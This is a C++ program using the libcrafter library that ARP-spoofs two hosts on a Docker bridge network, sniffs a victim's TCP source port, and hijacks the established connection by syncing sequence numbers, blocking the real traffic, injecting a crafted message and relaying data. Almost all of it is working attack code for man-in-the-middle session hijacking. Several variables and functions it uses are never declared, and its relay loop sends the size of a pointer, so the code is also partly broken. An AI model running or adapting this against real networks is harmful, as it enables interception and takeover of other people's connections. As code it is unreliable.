#include <crafter.h>
#include <crafter/Utils/TCPConnection.h>
#include <iostream>
#include <string>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/* Source port that we have to find out */
short_word srcport = 0;

void PacketHandler(Packet *sniff_packet, void *user) {

    /* Get the TCP layer from the packet */
    TCP *tcp_header = GetTCP(*sniff_packet);

    srcport = tcp_header->GetSrcPort();
}
int main() {

    /* Set the interface */
    string iface = "docker0";

    ip_forward();

    /* Set connection data */
    string dst_ip = "172.17.0.2"; // <-- Destination IP
    string src_ip = "172.17.0.3"; // <-- Spoof IP
    short_word dstport = 1234; // <-- We know the spoofed IP connects to this port

    /* Begin the spoofing */
    ARPContext *arp_context = ARPSpoofingReply(dst_ip, src_ip, iface);

    /* Print some info */
    PrintARPContext(*arp_context);
    string filter = "tcp and host " + dst_ip + " and host " + src_ip;
    /* TCP stuff */
    filter += " and dst port " + StrPort(dstport);
    /* Launch the sniffer */
    Sniffer sniff(filter, iface, PacketHandler);
    sniff.Capture(1);
    cout << "[@] Detected a source port: " << srcport << endl;

    /* ------------------------------------- */

    /* TCP connection victim to server */
    tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);
    /* TCP connection server to victim */
    tcp_s_to_v = new TCPConnection(dst_ip, src_ip, dstport, srcport, iface, TCPConnection::ESTABLISHED);
    /* Both connection are already established... */

    /* [+] Synchronize the ACK and SEQ numbers
     * This will block the program until some TCP packets from the spoofed connection
     * pass through your computer...
     */
    tcp_v_to_s->Sync();
    tcp_s_to_v->Sync();

    cout << "[@] Connections synchronized " << endl;

    /* Give all this a second... */
    // sleep(1);

    /* Start blocking the traffic of the spoofed connection */
    start_block(dst_ip, src_ip, dstport, srcport);

    /* Reset the connection to the victim */
    // tcp_s_to_v.Reset();
    // tcp_s_to_v.KeepAlive();

    auto op_data = (struct mvvm_op_data *)malloc(sizeof(struct mvvm_op_data));
    op_data->op = MVVM_SOCK_FIN;
    tcp_v_to_s->Send(((const byte_ *)op_data), sizeof(*op_data));
    backend_thread.clear();
    /* Close the spoofed connection with the server after we send our commands */
    tcp_v_to_s->Close();

    sleep(10);
    /* Clear everything */
    // new dest_ip;
    string dest_ip = "172.17.0.5";
    // new port
    // clear_block(dst_ip, src_ip, dstport, srcport);

    tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);

    bool closed = false;
    backend_thread.emplace_back([&]() {
        while (!closed) {
            auto payload = Payload();
            tcp_v_to_s->Read(payload);
            if (tcp_v_to_s->GetStatus() == TCPConnection::CLOSING) {
                closed = true;
                return;
            }
            tcp_s_to_v->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
        }
    });
    backend_thread.emplace_back([&]() {
        while (!closed) {
            auto payload = Payload();
            tcp_s_to_v->Read(payload);
            if (tcp_s_to_v->GetStatus() == TCPConnection::CLOSING) {
                closed = true;
                return;
            }
            tcp_v_to_s->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
        }
    });
    clear_forward();
    CleanARPContext(arp_context);

    return 0;
}